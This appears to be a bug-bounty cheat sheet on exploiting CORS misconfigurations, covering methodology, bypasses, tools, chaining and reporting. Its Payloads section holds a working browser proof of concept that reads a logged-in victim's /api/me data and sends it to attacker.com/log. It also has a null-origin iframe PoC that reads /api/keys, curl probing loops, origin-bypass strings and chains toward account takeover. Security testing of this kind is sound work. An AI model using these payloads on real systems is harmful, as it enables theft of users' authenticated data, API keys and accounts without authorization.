# CORS Misconfigurations
> One-line summary: when `Access-Control-Allow-Origin` reflects an attacker origin with credentials, any site can silently read the victim's authenticated data — API keys, tokens, PII.

## Overview
CORS is the browser mechanism that relaxes the same-origin policy for whitelisted origins. Misconfigurations arise when the server reflects the `Origin` header verbatim, trusts `null`, or validates origins with a broken regex (prefix/suffix matches, unescaped dots, missing anchors). The dangerous combination is a reflected or overly-broad `Access-Control-Allow-Origin` (ACAO) plus `Access-Control-Allow-Credentials: true` (ACAC): the victim's browser attaches their cookies to a cross-origin request from the attacker's page, and the attacker's JavaScript reads the response. Impact ranges from reading profile data, API keys, and anti-CSRF tokens to full account takeover when the response contains session material or sensitive account settings.

## Where to find it
- API endpoints returning per-user data with `Access-Control-Allow-Origin` reflected: check every authenticated GET
- `Access-Control-Allow-Credentials: true` combined with a reflected (not fixed) ACAO — the exploitable core
- `Origin: null` accepted (sandboxed iframes, `data:` URLs, `file://`) with credentials
- Wildcard-adjacent behavior: `ACAO: *` without credentials is not exploitable, but reflection effectively creates "wildcard with credentials"
- Broken regex allowlists: `target\.com` without anchors, subdomain rules like `.*\.target\.com$`, lists including a compromised/staging subdomain
- HTTP origin trusted when the app is HTTPS (`http://target.com` allowed)
- Real-world targets: login/SSO endpoints, `/api/me`, export/download endpoints, any endpoint that returns an API key, JWT, or CSRF token
- Multiple origins: CDN edge reflects on `/static/*` but not `/api/*` — test the API
- Pre-flight misconfigs: `Access-Control-Allow-Headers` too broad, `Access-Control-Allow-Methods: *`
- Missing `Vary: Origin` (caching angle — a cached ACAO response served to other origins)

## Methodology
1. Enumerate authenticated endpoints that return sensitive data (profile, settings, API keys, notifications, billing). Use your logged-in session in Burp.
2. For each, send an `Origin` header and read the response headers. Start with a clearly foreign origin: `Origin: https://evil.com`.
3. Look for the pair: `Access-Control-Allow-Origin` equal to your origin AND `Access-Control-Allow-Credentials: true`. Also check whether ACAO is only returned on non-error status codes.
4. Test origin variants systematically: your registered lookalike domain (`https://eviltarget.com`), `https://target.com.evil.com`, `https://evil.target.com`, `null`, `http://target.com`, and a subdomain you control.
5. Confirm exploitability with a real browser PoC: host a page on your origin that does `fetch(..., {credentials:'include'})` and reads the body. Only a readable response counts.
6. Check credential transport before claiming impact: cookie-based auth (exploitable) vs `Authorization: Bearer` header or localStorage tokens (CORS reflection is inert — the browser won't attach them). Note cookie `SameSite` attributes: `Lax`/`Strict` default blocks cross-site cookie sending (but a cross-site GET top-level navigation may still send Lax cookies).
7. Test the "null" origin specifically: use a sandboxed iframe (`<iframe sandbox="allow-scripts" srcdoc=...>`) or a `data:` URL to generate a real `Origin: null`.
8. Check preflight: send an `OPTIONS` with `Origin` and `Access-Control-Request-Method: DELETE`; some servers only validate on the actual request, not the preflight (bypasses blocked custom headers).
9. Check if the same reflection occurs on other hosts in scope (subdomains, mobile API gateways, staging) — the misconfig is often in a shared middleware but only reachable on some hosts.
10. Prove a token read: `GET /api/keys` or `/api/me` returning an API key / CSRF token; demonstrate reading it from your origin and (if a token) using it.

## Payloads
Detect reflection with curl:
```bash
curl -sI "https://target.com/api/me" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=SESSION_A" | grep -i "access-control"
# Vulnerable pair:
#   Access-Control-Allow-Origin: https://evil.com
#   Access-Control-Allow-Credentials: true
```

Test origin variants in one loop:
```bash
for o in "https://evil.com" "https://target.com.evil.com" \
         "https://eviltarget.com" "https://evil.target.com" \
         "null" "http://target.com" "https://sub.target.com"; do
  echo "== $o"
  curl -sI "https://target.com/api/me" -H "Origin: $o" \
    -H "Cookie: session=SESSION_A" | grep -i "access-control-allow-origin\|access-control-allow-credentials"
done
```

Browser Proof of Concept (host on attacker origin, victim visits while logged in):
```html
<script>
fetch("https://target.com/api/me", {credentials: "include"})
  .then(r => r.json())
  .then(d => fetch("https://attacker.com/log?d=" + encodeURIComponent(JSON.stringify(d))))
  .catch(e => fetch("https://attacker.com/log?err=" + e));
</script>
```

`null` origin PoC via a sandboxed iframe (no attacker server needed for the origin):
```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://target.com/api/keys', {credentials:'include'})
  .then(r => r.text())
  .then(d => parent.postMessage(d, '*'))
</script>"></iframe>
```

Preflight probe (checks whether the actual request is protected better than the preflight):
```bash
curl -si -X OPTIONS "https://target.com/api/account/delete" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" \
  -H "Access-Control-Request-Headers: authorization,x-custom"
```

Missing `Vary: Origin` check (cache poisoning angle):
```bash
curl -sI "https://target.com/api/me" -H "Origin: https://evil.com" | grep -i vary
# no Vary: Origin + shared cache => the reflected ACAO may be cached and served to other origins
```

## Bypasses & edge cases
- Regex bypasses: `.*\.target\.com$` matches `https://x.target.com` but also `https://x.target.com` embedded in `https://x.target.com.attacker.com` if the `$` is missing; `target\.com` without escaping the dot matches `targetXcom`.
- Prefix-only trust: `https://target.com.attacker.com` starts with the trusted string.
- Suffix-only trust: `https://attacker.com/target.com` or `https://attacker-target.com` end with it.
- Attacker-controlled subdomain: any XSS or takeover (`staging.target.com`) inherits the whitelist and can read credentials.
- `null` accepted: sandboxed iframes, `data:`, and redirects that strip `Origin` all produce it; a redirect chain from the target itself can turn a legitimate origin into `null`.
- `http://` variants accepted while app is HTTPS (downgrade; MITM reads the response).
- Port variations: `https://target.com:443` vs bare host — naive string comparison may treat them differently.
- Case tricks: `https://TARGET.com` vs lowercase comparisons.
- Backslash/percent tricks in some stacks: `https://target.com%60.evil.com`, `https://target.com\\.evil.com` (browser parser vs server parser disagreement).
- CORS on `GET` with credentials only; `OPTIONS` stricter — test both, exploit if the real request is permissible.
- `Access-Control-Allow-Credentials: true` with `ACAO: *` is rejected by browsers, but some frameworks send back the *request* origin in that case anyway — always test reflected values, not the configured literal.
- Credentials via URL or query token (rare) — reflection then leaks directly.
- Cookie `SameSite=Lax` blocks cross-site `fetch` with credentials but not a top-level navigation; if the endpoint is GET and readable via navigation, impact may still exist (usually not readable cross-origin though).
- Bearer-token apps: reflection is not exploitable via cookies — verify the app actually uses cookies before reporting.
- Check internal/older API hosts (`api-internal`, `m`, `www2`) that share middleware but have looser origin checks.

## Tools
- curl (above) — fastest first check per endpoint.
- Burp Repeater: add the `Origin` header, use "Request in browser" to see actual behavior; or Intruder with a payload list of origins:
```text
Intruder payloads:
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://evil.target.com
null
http://target.com
https://target.com:443
```
- Corsy (s0md3v): https://github.com/s0md3v/Corsy — fast scanner over a URL list:
```bash
python3 corsy.py -u https://target.com
python3 corsy.py -i urls.txt -t 20
```
- CORScanner (chenjj): https://github.com/chenjj/CORScanner
```bash
python3 cors_scan.py -u https://target.com -t 20
```
- nuclei CORS templates:
```bash
nuclei -tags cors -u https://target.com -stats
```
- Browser devtools: Network tab shows whether the response is readable (`Access-Control-Allow-Origin` mismatch is a hard fail visible in the console).
- Burp Collaborator / your VPS for the attacker page; serve the PoC over HTTPS with a valid certificate (mixed content won't run).

## Escalation & chaining
- CORS → read `/api/me` or `/api/keys` → API key extraction → full account takeover (the classic Kettle "bitcoins and bounties" case).
- CORS → steal CSRF token from a JSON endpoint → forge state-changing requests while SameSite=Lax would normally block them (the response read gives you the token; the write is same-origin via a form).
- CORS → read admin-only data if the reflected origin can be triggered by a low-priv user targeting an admin session (admin visits attacker page).
- CORS + subdomain XSS or subdomain takeover → whitelisted origin becomes attacker-controlled → any origin-based protection collapses.
- CORS + missing `Vary: Origin` → cached ACAO response served to a different origin → broader impact on shared caches/CDNs.
- CORS → internal network services (browser acts as proxy from victim's LAN) → chain with SSRF-style discovery of internal endpoints that also reflect origins.
- CORS → password reset/email change endpoints that accept JSON — read the response and complete an ATO chain.
- Chain with authentication.md: reflect-trusted origin + session fixation or weak reset = end-to-end ATO.

## Report notes
- The core evidence is a browser PoC reading authenticated data cross-origin. A raw curl showing reflected ACAO is a good signal but a triager will ask for the readable-response proof — include a screenshot/console output or a hosted HTML PoC.
- State the exact endpoints and the sensitive data returned (email, API key, CSRF token, session id). If it's a token you used, show the subsequent action with that token, then revoke/note the token was revoked.
- Include the full request/response init/headers of the preflight and the actual request (the exact `Access-Control-Allow-*` lines).
- Call out cookie behavior: which cookies are attached, `SameSite`/`Secure` flags observed, and whether the app enforces re-auth.
- If the misconfig is inert (Bearer tokens only, no credentials), say so and downgrade it yourself rather than letting triage do it — or skip reporting.
- Note the origin trust rule you bypassed (e.g., "suffix match on `target.com`") so the fix is unambiguous.
- Retest after a fix: ACAO should echo only whitelisted origins (never the request origin) and `Vary: Origin` should be present on cached responses.

## References
- [PortSwigger Academy: Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)
- [PortSwigger Academy: CORS and Access-Control-Allow-Origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
- [James Kettle — Exploiting CORS Misconfigurations for Bitcoins and Bounties (AppSec EU 2017)](https://2017.appsec.eu/presos/Hacker/Exploiting%20CORS%20Misconfigurations%20for%20Bitcoins%20and%20Bounties%20%20-%20James%20Kettle%20-%20OWASP_AppSec-Eu_2017.pdf)
- [HackTricks: CORS Bypass](https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html)
- [OWASP WSTG: Testing Cross Origin Resource Sharing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Cross_Origin_Resource_Sharing.html)
- [MDN: Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)
